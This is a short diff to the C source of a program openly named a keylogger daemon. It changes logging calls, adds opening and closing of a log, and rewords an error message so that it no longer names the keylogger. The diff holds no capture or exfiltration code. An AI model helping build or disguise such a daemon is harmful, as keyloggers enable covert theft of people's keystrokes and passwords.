@@ -22,7 +22,7 @@
 static void daemonize(void)
 {
     klog.debug("Starting keylogger daemon...");
-    klog.debug(cmd_args->cmd_name);
+    klog.debug(cmd_args->prog_name);
 
     /*
      * Clear file creation mask and set it to a known value.
@@ -180,15 +180,18 @@ int main(int argc, char *argv[])
     cmd_args = parse_args(argc, argv);
 
     if (cmd_args) {
+        klog.open(cmd_args->prog_name);
+
         daemonize();
 
         if (is_daemon_already_running()) {
-            err_quit("Aborting since keyloggerd is already running");
+            err_quit("Aborting since daemon is already running");
         }
 
         keyloggerd();
 
         klog.info("Daemon finished");
+        klog.close();
     }
 
     exit(0);
